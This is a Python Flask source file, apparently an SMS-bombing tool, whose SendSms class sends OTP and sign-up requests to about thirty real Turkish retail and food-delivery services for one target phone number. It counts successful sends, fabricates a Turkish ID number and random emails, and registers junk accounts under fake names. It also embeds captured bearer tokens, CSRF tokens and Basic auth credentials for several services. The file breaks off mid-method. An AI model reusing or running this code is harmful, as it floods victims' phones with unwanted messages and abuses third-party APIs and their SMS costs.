from flask import Flask, request, render_template_string, jsonify
import requests
from random import choice, randint
from string import ascii_lowercase
import threading
import time
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# ============================================================
# ORİJİNAL SendSms SINIFI (AYNEN)
# ============================================================
class SendSms:
    adet = 0
    _lock = threading.Lock()  # thread güvenliği
    
    def __init__(self, phone, mail):
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"

    def KahveDunyasi(self):    
        try:    
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json={"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["processStatus"] == "Success":
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:    
            pass

    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
            if wmf.status_code == 202:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
    
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
            if bim.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Englishhome(self):
        try:
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Referer": "https://www.englishhome.com/", "Content-Type": "application/json", "Origin": "https://www.englishhome.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers"}
            json={"Phone": self.phone, "XID": ""}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isError"] == False:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
          
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "Accept": "application/json", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Language": "en", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Encoding": "gzip, deflate, br", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1", "X-Mobillium-Os-Version": "15.8.3", "X-Mobillium-App-Version": "1.7.11"}
            data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["code"] == "common.success":
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
                
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
            
    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)      
            if r.status_code == 202:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
            json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
                pass
            else:
                raise
        except:
            with self._lock:
                self.adet += 1

    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["data"]["generateOtp"] == True:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
            json={"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-Project-Name": "rn-env", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.koton.com/", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 202:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.hayatsu.com.tr/", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM", "Origin": "https://www.hayatsu.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers"}
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["is_success"] == True:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Hizliecza(self):
        try:
            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "hizliecza/31 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9", "Authorization": "Bearer null"}
            json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Metro(self):
        try:
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate, br", "Applicationversion": "2.4.1", "Applicationplatform": "2", "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
            json={"methodType": "2", "mobilePhoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["status"] == "success":
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json={"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["responseType"] == "SUCCESS":
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
            
    def Akasya(self):
        try:
            url = "https://akasyaapi.poilabs.com:443/v1/en/sms"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", "User-Agent": "Akasya/2.0.13 (com.poilabs.akasyaavm; build:2; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["result"] == "SMS sended succesfully!":
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
        
    def Akbati(self):
        try:
            url = "https://akbatiapi.poilabs.com:443/v1/en/sms"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", "User-Agent": "Akdbat", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["result"] == "SMS sended succesfully!":
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
        
    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
            json={"FirmaId": 32, "Telefon": self.phone}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.komagene.com.tr/", "Anonymousclientid": "0dbf392b-ab10-48b3-5cda-31f3c19816e6", "Firmaid": "32", "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq", "Content-Type": "application/json", "Origin": "https://www.komagene.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["Success"] == True:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
    
    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json={"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.json()["status"]== "success":
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
    
    def Tasdelen(self):
        try:
            url = "https://tasdelen.sufirmam.com:3300/mobile/send-otp"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Tasdelen/5.9 (com.tasdelenapp; build:1; iOS 15.8.3) Alamofire/5.4.3", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["result"]== True:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
    
    def Uysal(self):
        try:
            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.uysalmarket.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.uysalmarket.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers"}
            json={"phone_number": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
    
    def Yapp(self):
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "X-Content-Language": "en", "Accept-Language": "en-BA;q=1, tr-BA;q=0.9, bs-BA;q=0.8", "Authorization": "Bearer ", "User-Agent": "YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)", "Accept-Encoding": "gzip, deflate, br"}
            json={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
    
    def YilmazTicaret(self):
        try:
            url = "https://app.buyursungelsin.com:443/api/customer/form/checkx"
            headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl", "Accept-Encoding": "gzip, deflate, br", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Ylmaz/38 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9"}
            data = f"--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/checkx\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"token\"\r\n\r\nd7841d399a16d0060d3b8a76bf70542e\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
    
    def Beefull(self):
        try:
            url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
            json={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}
            requests.post(url, json=json, timeout=4)
            url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
            json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
            r = requests.post(url, json=json, timeout=4)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = {"Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*", "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", "Appversion": "IOS-7.1.0", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Servicetype": "CarryOut", "Locationcode": "undefined"}
            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isSuccess"] == True:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Baydoner(self):
        try:
            url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
            headers = {"Content-Type": "application/json", "Accept": "*/*", "Xsid": "2HB7FQ6G42QL", "Dc": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "Os": "613A408535", "Accept-Language": "en-GB,en;q=0.9", "Merchantid": "5701", "Iskiosk": "0", "Sessionid": "", "Platform": "1", "Appv": "1.6.0", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "BaydonerCossla/190 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
            json={"AppVersion": "1.6.0", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "", "Culture": "tr-TR", "DeviceId": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "DeviceModel": "31", "DeviceToken": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "Email": self.mail, "GDPRPolicy": False, "Gender": "Kad1n", "GenderId": 2, "LoyaltyProgram": False, "merchantID": 5701, "Method": "", "Name": "Memati", "notificationCode": "fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g", "NotificationToken": "fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g", "OsSystem": "IOS", "Password": "31ABC..abc31", "PhoneNumber": self.phone, "Platform": 1, "sessionID": "", "socialId": "", "SocialMethod": "", "Surname": "Bas", "TempId": 0, "TermsAndConditions": False}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["Control"] == 1:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Pidem(self):
        try:
            url = "https://restashop.azurewebsites.net:443/graphql/"
            headers = {"Accept": "*/*", "Origin": "https://pidem.azurewebsites.net", "Content-Type": "application/json", "Authorization": "Bearer null", "Referer": "https://pidem.azurewebsites.net/", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Accept-Encoding": "gzip, deflate, br"}
            json={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}
            r = requests.post(url, headers=headers, json=json, timeout=6)
